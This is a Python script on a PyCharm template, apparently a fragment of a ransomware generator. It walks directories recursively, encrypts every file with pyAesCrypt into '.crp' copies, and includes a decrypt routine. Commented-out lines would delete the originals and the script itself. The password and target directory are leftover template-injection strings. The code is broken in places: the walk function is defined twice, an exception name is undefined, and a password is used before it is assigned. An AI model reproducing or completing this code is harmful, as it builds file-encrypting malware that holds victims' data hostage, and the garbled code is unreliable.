import os
import sys


def main(name):
    # Use a breakpoint in the code line below to debug your script.
    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.


def crypt(file):
    import pyAesCrypt
    print('-' * 80)
    # Set password and buffer size
    password = "'''+str(password)+'''"
    buffer_size = 512*1024
    # Call encryption function
    pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, buffer_size)
    print("[Encrypt] '"+str(file)+".crp'")
    # Remove the original file
    # os.remove(file)


def crypt2(file):
    import pyAesCrypt
    print('-' * 80)
    password = "'"+str(password)+"'"
    buffer_size = 512*1024
    pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, buffer_size)
    print("[Encrypt] '"+str(file)+".crp'")
    # os.remove(file)


# Decryption function
def decrypt(file):
    import pyAesCrypt
    print('-' * 80)
    password = "'''+str(password)+'''"
    buffer_size = 512 * 1024
    pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]), password, buffer_size)
    print("[Decrypt] '" + str(os.path.splitext(file)[0]) + "'")
    # os.remove(file)


# Parsing
def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            try:
                decrypt(path)
            except Error:
                pass
        else:
            walk(path)


walk("'''+str(direct)+'''")
print('-' * 80)
# os.remove(str(sys.argv[0]))


def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            crypt(path)
        else:
            walk(path)


walk("'''+str(direct)+'''")
print('-' * 80)
# os.remove(str(sys.argv[0]))

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    main('PyCharm')
